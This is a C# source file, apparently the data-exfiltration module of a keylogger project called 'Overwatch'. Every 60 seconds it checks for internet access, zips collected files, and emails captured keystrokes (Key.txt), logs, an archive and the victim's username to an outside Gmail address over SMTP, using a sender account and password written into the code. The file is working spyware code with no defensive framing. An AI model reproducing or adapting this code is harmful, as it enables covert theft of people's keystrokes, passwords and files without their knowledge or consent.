using System;
using System.Net;
using System.Net.Mail;
using System.IO;

namespace Overwatch
{
    class cSendingInformation
    {
        static appLog Log = new appLog();
        public void Sending() 
        {
            try
            {
                while (true)
                {
                    System.Threading.Thread.Sleep(60000);
                    if (ConnectivityChecker.CheckInternet() == true)
                    {
                        
                        //cKeylogger.send = true;
                        MailAddress from = new MailAddress("isthechastener@gmail.com");
                        MailAddress to = new MailAddress("satiriorn@gmail.com");
                        MailMessage message = new MailMessage(from, to);
                        cReceiveInformation.CompressionFile();
                        message.Subject = "Information";
                        message.Body = "<h2>" + cReceiveInformation.UsersName + "</h2>";
                        cMain.Abort();
                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
                        message.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));
                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\GeneralApplication.txt"));
                        message.IsBodyHtml = true;
                        SmtpClient smtp = new SmtpClient("smtp.gmail.com", 25);
                        smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
                        smtp.EnableSsl = true;
                        smtp.Send(message);
                        message.Dispose();
                        cMain.Start();
                    }
                }
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
    }
    public static class ConnectivityChecker
    {
        public delegate void Response();
        public static bool CheckInternet()
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry("dns.msftncsi.com");
                if (entry.AddressList.Length == 0)
                    return false;
                else
                    if (!entry.AddressList[0].ToString().Equals("131.107.255.255"))
                        return true;
            }
            catch { return false;}

            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://www.msftncsi.com/ncsi.txt");
            try
            {
                HttpWebResponse responce = (HttpWebResponse)request.GetResponse();

                if (responce.StatusCode != HttpStatusCode.OK)
                    return true;
                using (StreamReader sr = new StreamReader(responce.GetResponseStream()))
                {
                    return sr.ReadToEnd().Equals("Microsoft NCSI") ? true : true;
                }
            }
            catch{ return false;}
        }
    }
}
